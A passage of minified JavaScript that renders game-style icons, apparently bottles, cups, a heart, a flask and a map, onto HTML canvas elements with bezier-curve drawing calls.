      n.bezierCurveTo(e * 211.57142639160156, e * 227.59821128845215, e * 211.57142639160156, e * 227.59821128845215, e * 211.57142639160156, e * 304.81249618530273);
      n.bezierCurveTo(e * 212.57142639160156, e * 328.81249618530273, e * 209.57142639160156, e * 330.81249618530273, e * 188.57142639160156, e * 333.81249618530273);
      n.bezierCurveTo(e * 155.07142639160156, e * 333.31249618530273, e * 155.07142639160156, e * 333.31249618530273, e * 121.57142639160156, e * 332.81249618530273);
      n.bezierCurveTo(e * 104.57142639160156, e * 327.81249618530273, e * 105.57142639160156, e * 328.81249618530273, e * 104.57142639160156, e * 312.81249618530273);
      n.bezierCurveTo(e * 104.57142639160156, e * 228.16963958740234, e * 104.57142639160156, e * 228.16963958740234, e * 104.57142639160156, e * 143.52678298950195);
      n.bezierCurveTo(e * 106.57142639160156, e * 124.52678298950195, e * 110.57142639160156, e * 123.52678298950195, e * 123.57142639160156, e * 116.52678298950195);
      n.bezierCurveTo(e * 136.57142639160156, e * 110.52678298950195, e * 130.57142639160156, e * 106.52678298950195, e * 126.57142639160156, e * 98.52678298950195);
      n.closePath();
      ye(n, undefined, t[5], e * 15);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 125.57142639160156, e * 156.66963958740234);
      n.bezierCurveTo(e * 125.57142639160156, e * 182.66963958740234, e * 125.57142639160156, e * 182.66963958740234, e * 125.57142639160156, e * 208.66963958740234);
      n.closePath();
      ye(n, undefined, t[6], e * 15);
      return r;
    }
    function sn(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 316;
      r.height = e * 365;
      n.save();
      n.translate(e * 156.07142639160156, e * 51.81248474121094);
      n.rotate(0);
      Be(n, e * -21.5, e * -34, e * 43, e * 68, e * 8);
      n.restore();
      ye(n, t[1], t[2], e * 15);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 126.57142639160156, e * 67.38392639160156);
      n.bezierCurveTo(e * 126.57142639160156, e * 57.38392639160156, e * 132.57142639160156, e * 54.38392639160156, e * 140.57142639160156, e * 54.38392639160156);
      n.bezierCurveTo(e * 177.57142639160156, e * 55.38392639160156, e * 158.07142639160156, e * 54.38392639160156, e * 175.57142639160156, e * 54.38392639160156);
      n.bezierCurveTo(e * 185.57142639160156, e * 56.38392639160156, e * 185.57142639160156, e * 57.38392639160156, e * 184.57142639160156, e * 66.38392639160156);
      n.bezierCurveTo(e * 184.57142639160156, e * 78.38392639160156, e * 184.57142639160156, e * 89.38392639160156, e * 184.57142639160156, e * 90.38392639160156);
      n.bezierCurveTo(e * 177.57142639160156, e * 107.38392639160156, e * 180.57142639160156, e * 112.38392639160156, e * 189.57142639160156, e * 116.38392639160156);
      n.bezierCurveTo(e * 212.57142639160156, e * 127.38392639160156, e * 212.57142639160156, e * 132.38392639160156, e * 211.57142639160156, e * 150.38392639160156);
      n.bezierCurveTo(e * 211.57142639160156, e * 227.59821128845215, e * 211.57142639160156, e * 227.59821128845215, e * 211.57142639160156, e * 304.81249618530273);
      n.bezierCurveTo(e * 212.57142639160156, e * 328.81249618530273, e * 209.57142639160156, e * 330.81249618530273, e * 188.57142639160156, e * 333.81249618530273);
      n.bezierCurveTo(e * 155.07142639160156, e * 333.31249618530273, e * 155.07142639160156, e * 333.31249618530273, e * 121.57142639160156, e * 332.81249618530273);
      n.bezierCurveTo(e * 104.57142639160156, e * 327.81249618530273, e * 105.57142639160156, e * 328.81249618530273, e * 104.57142639160156, e * 312.81249618530273);
      n.bezierCurveTo(e * 104.57142639160156, e * 228.16963958740234, e * 104.57142639160156, e * 228.16963958740234, e * 104.57142639160156, e * 143.52678298950195);
      n.bezierCurveTo(e * 106.57142639160156, e * 124.52678298950195, e * 110.57142639160156, e * 123.52678298950195, e * 123.57142639160156, e * 116.52678298950195);
      n.bezierCurveTo(e * 136.57142639160156, e * 110.52678298950195, e * 130.57142639160156, e * 106.52678298950195, e * 126.57142639160156, e * 98.52678298950195);
      n.closePath();
      ye(n, undefined, t[5], e * 15);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 125.57142639160156, e * 156.66963958740234);
      n.bezierCurveTo(e * 125.57142639160156, e * 182.66963958740234, e * 125.57142639160156, e * 182.66963958740234, e * 125.57142639160156, e * 208.66963958740234);
      n.closePath();
      ye(n, undefined, t[6], e * 15);
      return r;
    }
    function _n(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 400;
      r.height = e * 400;
      n.translate(0, e * 15);
      n.globalAlpha = i ? 0.5 : 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 102, e * 154);
      n.bezierCurveTo(e * 108, e * 216.5, e * 108, e * 216.5, e * 114, e * 279);
      n.bezierCurveTo(e * 124, e * 300, e * 237, e * 299, e * 251, e * 279);
      n.bezierCurveTo(e * 257, e * 217, e * 257, e * 217, e * 263, e * 155);
      n.bezierCurveTo(e * 248, e * 194, e * 91, e * 180, e * 103, e * 156);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 102, e * 154);
      n.bezierCurveTo(e * 106, e * 53, e * 255, e * 53, e * 263, e * 154);
      n.bezierCurveTo(e * 248, e * 38, e * 99, e * 69, e * 103, e * 154);
      n.closePath();
      ye(n, undefined, t[0], e * 11);
      n.translate(0, e * -5);
      n.globalAlpha = 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 103, e * 154);
      n.bezierCurveTo(e * 98, e * 119, e * 264, e * 119, e * 264, e * 154);
      n.bezierCurveTo(e * 271, e * 189, e * 94, e * 188, e * 103, e * 154);
      n.closePath();
      ye(n, t[3], t[2], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 102, e * 154);
      n.bezierCurveTo(e * 108, e * 216.5, e * 108, e * 216.5, e * 114, e * 279);
      n.bezierCurveTo(e * 124, e * 300, e * 237, e * 299, e * 251, e * 279);
      n.bezierCurveTo(e * 257, e * 217, e * 257, e * 217, e * 263, e * 155);
      n.bezierCurveTo(e * 248, e * 194, e * 91, e * 180, e * 103, e * 156);
      n.closePath();
      ye(n, t[1], t[2], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 182, e * 185);
      n.bezierCurveTo(e * 182.5, e * 237.5, e * 182.5, e * 237.5, e * 183, e * 290);
      n.closePath();
      ye(n, undefined, t[2], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 222, e * 287);
      n.bezierCurveTo(e * 226, e * 233.5, e * 226, e * 233.5, e * 230, e * 180);
      n.closePath();
      ye(n, undefined, t[2], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 145, e * 290);
      n.bezierCurveTo(e * 140.5, e * 237, e * 140.5, e * 237, e * 136, e * 184);
      n.closePath();
      ye(n, t[1], t[2], e * 11);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 105, e * 184);
      n.bezierCurveTo(e * 148, e * 205, e * 231, e * 202, e * 260, e * 182);
      n.bezierCurveTo(e * 259, e * 195.5, e * 259, e * 195.5, e * 258, e * 209);
      n.bezierCurveTo(e * 217, e * 218, e * 163, e * 225, e * 108, e * 207);
      n.closePath();
      ye(n, t[4], t[2], e * 11);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 251, e * 276);
      n.bezierCurveTo(e * 251.5, e * 267.5, e * 251.5, e * 267.5, e * 252, e * 259);
      n.bezierCurveTo(e * 212, e * 272, e * 156, e * 275, e * 112, e * 260);
      n.bezierCurveTo(e * 112.5, e * 269, e * 112.5, e * 269, e * 113, e * 278);
      n.bezierCurveTo(e * 155, e * 306, e * 253, e * 286, e * 250, e * 276);
      n.closePath();
      ye(n, t[4], t[2], e * 11);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 102, e * 154);
      n.bezierCurveTo(e * 106, e * 53, e * 255, e * 53, e * 263, e * 154);
      n.bezierCurveTo(e * 248, e * 38, e * 99, e * 69, e * 103, e * 154);
      n.closePath();
      ye(n, undefined, t[2], e * 11);
      return r;
    }
    function En(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 400;
      r.height = e * 400;
      n.translate(0, e * 15);
      n.globalAlpha = i ? 0.5 : 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 102, e * 154);
      n.bezierCurveTo(e * 108, e * 216.5, e * 108, e * 216.5, e * 114, e * 279);
      n.bezierCurveTo(e * 124, e * 300, e * 237, e * 299, e * 251, e * 279);
      n.bezierCurveTo(e * 257, e * 217, e * 257, e * 217, e * 263, e * 155);
      n.bezierCurveTo(e * 248, e * 194, e * 91, e * 180, e * 103, e * 156);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 102, e * 154);
      n.bezierCurveTo(e * 106, e * 53, e * 255, e * 53, e * 263, e * 154);
      n.bezierCurveTo(e * 248, e * 38, e * 99, e * 69, e * 103, e * 154);
      n.closePath();
      ye(n, undefined, t[0], e * 11);
      n.translate(0, e * -5);
      n.globalAlpha = 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 103, e * 154);
      n.bezierCurveTo(e * 98, e * 119, e * 264, e * 119, e * 264, e * 154);
      n.bezierCurveTo(e * 271, e * 189, e * 94, e * 188, e * 103, e * 154);
      n.closePath();
      ye(n, t[3], t[2], e * 12);
      n.translate(0, e * 25);
      n.globalAlpha = 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 103, e * 154);
      n.bezierCurveTo(e * 98, e * 119, e * 264, e * 119, e * 264, e * 154);
      n.bezierCurveTo(e * 271, e * 189, e * 94, e * 188, e * 103, e * 154);
      n.closePath();
      ye(n, t[5]);
      n.translate(0, e * -25);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 102, e * 154);
      n.bezierCurveTo(e * 108, e * 216.5, e * 108, e * 216.5, e * 114, e * 279);
      n.bezierCurveTo(e * 124, e * 300, e * 237, e * 299, e * 251, e * 279);
      n.bezierCurveTo(e * 257, e * 217, e * 257, e * 217, e * 263, e * 155);
      n.bezierCurveTo(e * 248, e * 194, e * 91, e * 180, e * 103, e * 156);
      n.closePath();
      ye(n, t[1], t[2], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 182, e * 185);
      n.bezierCurveTo(e * 182.5, e * 237.5, e * 182.5, e * 237.5, e * 183, e * 290);
      n.closePath();
      ye(n, undefined, t[2], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 222, e * 287);
      n.bezierCurveTo(e * 226, e * 233.5, e * 226, e * 233.5, e * 230, e * 180);
      n.closePath();
      ye(n, undefined, t[2], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 145, e * 290);
      n.bezierCurveTo(e * 140.5, e * 237, e * 140.5, e * 237, e * 136, e * 184);
      n.closePath();
      ye(n, t[1], t[2], e * 11);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 105, e * 184);
      n.bezierCurveTo(e * 148, e * 205, e * 231, e * 202, e * 260, e * 182);
      n.bezierCurveTo(e * 259, e * 195.5, e * 259, e * 195.5, e * 258, e * 209);
      n.bezierCurveTo(e * 217, e * 218, e * 163, e * 225, e * 108, e * 207);
      n.closePath();
      ye(n, t[4], t[2], e * 11);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 251, e * 276);
      n.bezierCurveTo(e * 251.5, e * 267.5, e * 251.5, e * 267.5, e * 252, e * 259);
      n.bezierCurveTo(e * 212, e * 272, e * 156, e * 275, e * 112, e * 260);
      n.bezierCurveTo(e * 112.5, e * 269, e * 112.5, e * 269, e * 113, e * 278);
      n.bezierCurveTo(e * 155, e * 306, e * 253, e * 286, e * 250, e * 276);
      n.closePath();
      ye(n, t[4], t[2], e * 11);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 102, e * 154);
      n.bezierCurveTo(e * 106, e * 53, e * 255, e * 53, e * 263, e * 154);
      n.bezierCurveTo(e * 248, e * 38, e * 99, e * 69, e * 103, e * 154);
      n.closePath();
      ye(n, undefined, t[2], e * 11);
      return r;
    }
    function Tn(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 80;
      r.height = e * 160;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 5, e * 5);
      n.save();
      Be(n, e * 33, e * 53, e * 10, e * 98, e * 10);
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.translate(e * -150, e * -100);
      n.moveTo(e * 167.5, e * 171.0625);
      n.bezierCurveTo(e * 188, e * 171.0625, e * 188, e * 171.0625, e * 208.5, e * 171.0625);
      n.bezierCurveTo(e * 208.5, e * 156.0625, e * 208.5, e * 156.0625, e * 208.5, e * 141.0625);
      n.bezierCurveTo(e * 203.5, e * 113.0625, e * 179.5, e * 96.0625, e * 167.5, e * 141.0625);
      n.closePath();
      ye(n, t[0]);
      n.restore();
      n.globalAlpha = 1;
      n.translate(e * -5, e * -5);
      n.save();
      Be(n, e * 33, e * 53, e * 10, e * 98, e * 10);
      ye(n, t[1], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.translate(e * -150, e * -100);
      n.moveTo(e * 167.5, e * 171.0625);
      n.bezierCurveTo(e * 188, e * 171.0625, e * 188, e * 171.0625, e * 208.5, e * 171.0625);
      n.bezierCurveTo(e * 208.5, e * 156.0625, e * 208.5, e * 156.0625, e * 208.5, e * 141.0625);
      n.bezierCurveTo(e * 203.5, e * 113.0625, e * 179.5, e * 96.0625, e * 167.5, e * 141.0625);
      n.closePath();
      ye(n, t[3], t[4], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.translate(e * 0, e * 1);
      n.moveTo(e * 180.5, e * 169.0625);
      n.bezierCurveTo(e * 180.5, e * 157.5625, e * 180.5, e * 157.5625, e * 180.5, e * 146.0625);
      n.bezierCurveTo(e * 181.5, e * 134.0625, e * 193.5, e * 129.0625, e * 196.5, e * 146.0625);
      n.bezierCurveTo(e * 196.5, e * 157.5625, e * 196.5, e * 157.5625, e * 196.5, e * 169.0625);
      n.closePath();
      ye(n, t[5]);
      n.restore();
      return r;
    }
    function An(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 109;
      r.height = e * 110;
      ze(n, e * 54.5, e * 55, e * 48.038209575038294);
      ye(n, i[0], i[1], e * 8);
      if (t == 0) {
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 54.928558349609375, e * 43.72320556640625);
        n.bezierCurveTo(e * 66.92855834960938, e * 31.72320556640625, e * 69.92855834960938, e * 29.72320556640625, e * 74.92855834960938, e * 29.72320556640625);
        n.bezierCurveTo(e * 86.92855834960938, e * 28.72320556640625, e * 91.92855834960938, e * 42.72320556640625, e * 89.92855834960938, e * 52.72320556640625);
        n.bezierCurveTo(e * 88.92855834960938, e * 63.72320556640625, e * 73.92855834960938, e * 75.72320556640625, e * 55.928558349609375, e * 87.72320556640625);
        n.bezierCurveTo(e * 37.928558349609375, e * 78.72320556640625, e * 26.928558349609375, e * 65.72320556640625, e * 19.928558349609375, e * 54.72320556640625);
        n.bezierCurveTo(e * 13.928558349609375, e * 42.72320556640625, e * 21.928558349609375, e * 28.72320556640625, e * 35.928558349609375, e * 29.72320556640625);
        n.bezierCurveTo(e * 45.928558349609375, e * 31.72320556640625, e * 51.928558349609375, e * 40.72320556640625, e * 53.928558349609375, e * 44.72320556640625);
        n.closePath();
        ye(n, i[2]);
      } else if (t == 1) {
        n.save();
        n.translate(e * 55, e * 39.48748779296875);
        Be(n, e * -11.5, e * -36, e * 23, e * 72, e * 10);
        n.restore();
        ye(n, i[2], i[3], e * 4);
        ze(n, e * 54.5, e * 78.48748779296875, e * 22.02271554554524);
        ye(n, i[4], i[3], e * 4);
        n.save();
        n.translate(e * 55.5, e * 57.287506103515625);
        Be(n, e * -9, e * -16, e * 18, e * 32, e * 10);
        n.restore();
        ye(n, i[4]);
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 66.5, e * 25.287506103515625);
        n.bezierCurveTo(e * 60.5, e * 25.287506103515625, e * 63.5, e * 25.287506103515625, e * 54.5, e * 25.287506103515625);
        n.closePath();
        ye(n, undefined, i[5], e * 4);
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 66.5, e * 37.287506103515625);
        n.bezierCurveTo(e * 60.5, e * 37.287506103515625, e * 60.5, e * 37.287506103515625, e * 54.5, e * 37.287506103515625);
        n.closePath();
        ye(n, undefined, i[5], e * 4);
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 66.5, e * 50.287506103515625);
        n.bezierCurveTo(e * 61, e * 50.287506103515625, e * 61, e * 50.287506103515625, e * 55.5, e * 50.287506103515625);
        n.closePath();
        ye(n, undefined, i[5], e * 4);
      } else if (t == 2) {
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 45.928558349609375, e * 55.29463195800781);
        n.bezierCurveTo(e * 38.928558349609375, e * 67.29463195800781, e * 38.928558349609375, e * 67.29463195800781, e * 31.928558349609375, e * 79.29463195800781);
        n.bezierCurveTo(e * 15.928558349609375, e * 85.29463195800781, e * 17.928558349609375, e * 86.29463195800781, e * 17.928558349609375, e * 90.29463195800781);
        n.bezierCurveTo(e * 19.928558349609375, e * 94.29463195800781, e * 21.928558349609375, e * 94.29463195800781, e * 27.928558349609375, e * 92.29463195800781);
        n.bezierCurveTo(e * 29.928558349609375, e * 98.29463195800781, e * 30.928558349609375, e * 99.29463195800781, e * 33.928558349609375, e * 99.29463195800781);
        n.bezierCurveTo(e * 38.928558349609375, e * 97.29463195800781, e * 38.928558349609375, e * 93.29463195800781, e * 37.928558349609375, e * 86.29463195800781);
        n.bezierCurveTo(e * 45.428558349609375, e * 73.29463195800781, e * 51.928558349609375, e * 64.29463195800781, e * 52.928558349609375, e * 60.29463195800781);
        n.closePath();
        ye(n, i[2]);
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 55.928558349609375, e * 8.866058349609375);
        n.bezierCurveTo(e * 35.928558349609375, e * 35.866058349609375, e * 37.928558349609375, e * 48.866058349609375, e * 46.928558349609375, e * 62.866058349609375);
        n.bezierCurveTo(e * 65.92855834960938, e * 72.86605834960938, e * 80.92855834960938, e * 55.866058349609375, e * 93.92855834960938, e * 36.866058349609375);
        n.closePath();
        ye(n, i[3], i[4], e * 6);
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 93.92855834960938, e * 36.866058349609375);
        n.bezierCurveTo(e * 82.92855834960938, e * 37.866058349609375, e * 77.92855834960938, e * 36.866058349609375, e * 67.92855834960938, e * 28.866058349609375);
        n.bezierCurveTo(e * 53.928558349609375, e * 16.866058349609375, e * 53.928558349609375, e * 14.866058349609375, e * 55.928558349609375, e * 7.866058349609375);
        n.bezierCurveTo(e * 65.92855834960938, e * 4.866058349609375, e * 71.92855834960938, e * 7.866058349609375, e * 83.92855834960938, e * 13.866058349609375);
        n.bezierCurveTo(e * 96.92855834960938, e * 21.866058349609375, e * 95.92855834960938, e * 31.866058349609375, e * 92.92855834960938, e * 36.866058349609375);
        n.closePath();
        ye(n, i[3], i[4], e * 6);
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 68.92855834960938, e * 16.866058349609375);
        n.bezierCurveTo(e * 71.92855834960938, e * 13.866058349609375, e * 76.92855834960938, e * 16.866058349609375, e * 79.92855834960938, e * 21.866058349609375);
        n.bezierCurveTo(e * 82.92855834960938, e * 24.866058349609375, e * 81.92855834960938, e * 27.866058349609375, e * 73.92855834960938, e * 24.866058349609375);
        n.bezierCurveTo(e * 67.92855834960938, e * 20.866058349609375, e * 66.92855834960938, e * 19.866058349609375, e * 67.92855834960938, e * 17.866058349609375);
        n.closePath();
        ye(n, i[2]);
      } else if (t == 3) {
        n.scale(0.9, 0.9);
        n.translate(e * 6, 0);
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 54, e * 0.421875);
        n.bezierCurveTo(e * 84, e * 45.421875, e * 89, e * 51.421875, e * 83, e * 74.421875);
        n.bezierCurveTo(e * 74, e * 95.421875, e * 46, e * 98.421875, e * 30, e * 78.421875);
        n.bezierCurveTo(e * 22, e * 59.421875, e * 27, e * 49.421875, e * 34, e * 36.421875);
        n.closePath();
        ye(n, i[2], i[3], e * 6);
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 74, e * 52.421875);
        n.bezierCurveTo(e * 77, e * 73.421875, e * 69, e * 81.421875, e * 58, e * 81.421875);
        n.bezierCurveTo(e * 66, e * 71.421875, e * 70, e * 66.421875, e * 74, e * 52.421875);
        n.closePath();
        ye(n, i[3]);
      }
      return r;
    }
    function dn(e) {
      var i = document.createElement("canvas");
      var t = i.getContext("2d");
      var r = e * 600;
      var n = e * 22;
      var a = e * 4;
      var o = e * 4;
      i.width = r;
      i.height = n;
      Be(t, e * 5, e * 5, r - e * 10, n - e * 10, a);
      ye(t, null, "#BBE8EF", o);
      return i;
    }
    function hn(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 573;
      r.height = e * 350;
      if (t == 1) {
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 336, e * 72);
        n.bezierCurveTo(e * 366, e * 15, e * 426, e * 36, e * 497, e * 83);
        n.bezierCurveTo(e * 522, e * 85, e * 522, e * 85, e * 547, e * 87);
        n.bezierCurveTo(e * 476.5, e * 205, e * 476.5, e * 205, e * 406, e * 323);
        n.bezierCurveTo(e * 297.5, e * 319, e * 297.5, e * 319, e * 189, e * 315);
        n.bezierCurveTo(e * 105.5, e * 279, e * 105.5, e * 279, e * 22, e * 243);
        n.bezierCurveTo(e * 92, e * 140, e * 92, e * 140, e * 162, e * 37);
        n.bezierCurveTo(e * 173, e * 39, e * 173, e * 39, e * 184, e * 41);
        n.bezierCurveTo(e * 185, e * 38.5, e * 185, e * 38.5, e * 186, e * 36);
        n.bezierCurveTo(e * 323, e * 13, e * 322, e * 25, e * 337, e * 74);
        n.closePath();
        ye(n, i[4], i[4], e * 35);
      }
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 168, e * 42);
      n.bezierCurveTo(e * 255, e * 60, e * 255, e * 60, e * 342, e * 78);
      n.bezierCurveTo(e * 443, e * 81.5, e * 443, e * 81.5, e * 544, e * 85);
      n.bezierCurveTo(e * 475, e * 204.5, e * 475, e * 204.5, e * 406, e * 324);
      n.bezierCurveTo(e * 297.5, e * 320, e * 297.5, e * 320, e * 189, e * 316);
      n.bezierCurveTo(e * 105.5, e * 279, e * 105.5, e * 279, e * 22, e * 242);
      n.closePath();
      ye(n, i[0], i[1], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 188, e * 41);
      n.bezierCurveTo(e * 308, e * 15, e * 325, e * 18, e * 337, e * 66);
      n.bezierCurveTo(e * 191, e * 305, e * 196, e * 286, e * 184, e * 307);
      n.bezierCurveTo(e * 175, e * 250, e * 90, e * 254, e * 52, e * 241);
      n.closePath();
      ye(n, i[2], i[3], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 336, e * 71);
      n.bezierCurveTo(e * 375, e * 8, e * 429, e * 50, e * 518, e * 92);
      n.bezierCurveTo(e * 455, e * 199.5, e * 455, e * 199.5, e * 392, e * 307);
      n.bezierCurveTo(e * 227, e * 301, e * 261, e * 255, e * 188, e * 308);
      n.closePath();
      ye(n, i[2], i[3], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 357, e * 76);
      n.bezierCurveTo(e * 390, e * 67, e * 414, e * 86, e * 435, e * 104);
      n.bezierCurveTo(e * 417, e * 135, e * 417, e * 135, e * 399, e * 166);
      n.bezierCurveTo(e * 352, e * 140, e * 345, e * 139, e * 319, e * 142);
      n.closePath();
      ye(n, i[3], i[3], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 309, e * 168);
      n.bezierCurveTo(e * 345, e * 163, e * 372, e * 180, e * 412, e * 203);
      ye(n, i[2], i[3], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 263, e * 54);
      n.bezierCurveTo(e * 305, e * 44, e * 307, e * 51, e * 311, e * 64);
      n.bezierCurveTo(e * 270.5, e * 129.5, e * 270.5, e * 129.5, e * 230, e * 195);
      n.bezierCurveTo(e * 221, e * 175, e * 203, e * 171, e * 186, e * 172);
      n.closePath();
      ye(n, i[3], i[3], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 292, e * 198);
      n.bezierCurveTo(e * 328, e * 191, e * 364, e * 211, e * 401, e * 237);
      ye(n, i[2], i[3], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 245, e * 68);
      n.bezierCurveTo(e * 210, e * 72, e * 210, e * 72, e * 189, e * 69);
      ye(n, i[2], i[3], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 222, e * 96);
      n.bezierCurveTo(e * 196, e * 97, e * 193, e * 97, e * 177, e * 92);
      ye(n, i[2], i[3], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 207, e * 124);
      n.bezierCurveTo(e * 179, e * 123, e * 177, e * 124, e * 161, e * 119);
      ye(n, i[2], i[3], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 115, e * 183);
      n.bezierCurveTo(e * 184, e * 185, e * 203, e * 198, e * 219, e * 221);
      ye(n, i[2], i[3], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 98, e * 213);
      n.bezierCurveTo(e * 161, e * 214, e * 193, e * 227, e * 201, e * 249);
      ye(n, i[2], i[3], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 399, e * 257);
      n.bezierCurveTo(e * 287, e * 215, e * 280, e * 215, e * 263, e * 222);
      n.bezierCurveTo(e * 253, e * 238, e * 247, e * 245, e * 243, e * 254);
      n.bezierCurveTo(e * 267, e * 236, e * 292, e * 263, e * 377, e * 284);
      ye(n, i[3], i[3], e * 12);
      return r;
    }
    function In(e, i, t, r) {
      var n = document.createElement("canvas");
      var a = n.getContext("2d");
      n.width = e * 170;
      n.height = e * 200;
      a.translate(e * 5, e * 15);
      if (r == 1) {
        a.translate(0, e * -5);
        ze(a, e * 77.00003051757812, e * 104.49432373046875, e * 71.84010022264724);
        ye(a, t[1], t[5], e * 20);
        ze(a, e * 77.00003051757812, e * 104.22160339355469, e * 61.554853586049575);
        ye(a, t[1], t[5], e * 20);
        a.save();
        a.translate(e * 77.00003051757812, e * 31.267044067382812);
        Be(a, e * -6, e * -12.5, e * 12, e * 25, e * 10);
        a.restore();
        ye(a, t[1], t[5], e * 20);
        a.save();
        a.translate(e * 77.00003051757812, e * 13.267044067382812);
        Be(a, e * -15, e * -10.5, e * 30, e * 21, e * 10);
        a.restore();
        ye(a, t[1], t[5], e * 20);
      }
      ze(a, e * 77.00003051757812, e * 104.49432373046875, e * 71.84010022264724);
      ye(a, t[1], t[2], e * 7);
      ze(a, e * 77.00003051757812, e * 104.22160339355469, e * 61.554853586049575);
      ye(a, t[1], t[2], e * 7);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 18.000030517578125, e * 105.85795593261719);
      a.bezierCurveTo(e * 134.00003051757812, e * 104.85795593261719, e * 77.00003051757812, e * 104.85795593261719, e * 136.00003051757812, e * 103.85795593261719);
      a.closePath();
      ye(a, t[1], t[2], e * 8);
      ze(a, e * 77.00003051757812, e * 104.6761474609375, e * 32.55764119219941);
      ye(a, t[1], t[2], e * 8);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 78.00003051757812, e * 112.03977966308594);
      a.bezierCurveTo(e * 78.00003051757812, e * 87.03977966308594, e * 78.00003051757812, e * 87.03977966308594, e * 78.00003051757812, e * 62.03977966308594);
      a.closePath();
      ye(a, t[3], t[2], e * 8);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 78.00003051757812, e * 48.03977966308594);
      a.bezierCurveTo(e * 82.00003051757812, e * 55.53977966308594, e * 82.00003051757812, e * 55.53977966308594, e * 86.00003051757812, e * 63.03977966308594);
